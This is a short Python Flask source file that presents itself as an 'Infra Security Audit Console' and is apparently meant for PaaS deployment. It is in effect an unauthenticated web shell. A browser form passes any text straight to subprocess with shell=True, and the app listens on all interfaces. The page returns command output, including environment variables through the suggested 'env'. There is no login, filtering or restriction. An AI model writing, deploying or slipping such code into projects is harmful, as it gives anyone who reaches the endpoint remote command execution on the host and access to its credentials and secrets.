from flask import Flask, request, render_template_string
import subprocess
import os

app = Flask(__name__)

# 브라우저에서 편리하게 명령어를 입력하고 결과를 보기 위한 템플릿
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Infra Audit Console</title>
    <style>
        body { background-color: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
        input[type="text"] { width: 80%; background: #333; color: #fff; border: 1px solid #555; padding: 5px; }
        button { background: #00ff00; color: #000; border: none; padding: 5px 15px; cursor: pointer; font-weight: bold; }
        pre { background: #222; padding: 15px; border-radius: 5px; overflow-x: auto; white-space: pre-wrap; }
    </style>
</head>
<body>
    <h2>💻 Infra Security Audit Console</h2>
    <form method="POST">
        <input type="text" name="command" placeholder="Enter linux command (e.g., id, ls -la, env)" autofocus>
        <button type="submit">Execute</button>
    </form>
    <h3>📄 Execution Result:</h3>
    <pre>{{ result }}</pre>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    result = ""
    if request.method == 'POST':
        cmd = request.form.get('command')
        if cmd:
            try:
                # 시스템 명령어를 실행하고 표준 출력과 에러를 모두 포획
                result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, text=True)
            except subprocess.CalledProcessError as e:
                result = f"Error (Exit Code {e.returncode}):\n{e.output}"
            except Exception as e:
                result = f"Exception occurred: {str(e)}"
    return render_template_string(HTML_TEMPLATE, result=result)

if __name__ == '__main__':
    # PaaS 환경에 맞게 포트 바인딩 (일반적으로 5000 또는 환경변수 PORT 사용)
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)